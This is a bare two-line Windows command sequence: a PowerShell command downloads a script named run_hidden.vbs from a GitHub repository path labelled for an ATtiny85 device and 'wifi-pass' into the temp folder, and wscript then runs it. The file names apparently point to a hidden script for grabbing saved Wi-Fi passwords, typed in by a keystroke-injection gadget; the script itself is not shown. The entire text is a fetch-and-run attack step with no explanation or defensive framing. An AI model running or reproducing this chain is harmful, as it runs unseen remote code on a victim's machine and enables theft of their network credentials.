powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/wifi-pass/run_hidden.vbs' -OutFile %TEMP%\run_hidden.vbs"
wscript %TEMP%\run_hidden.vbs
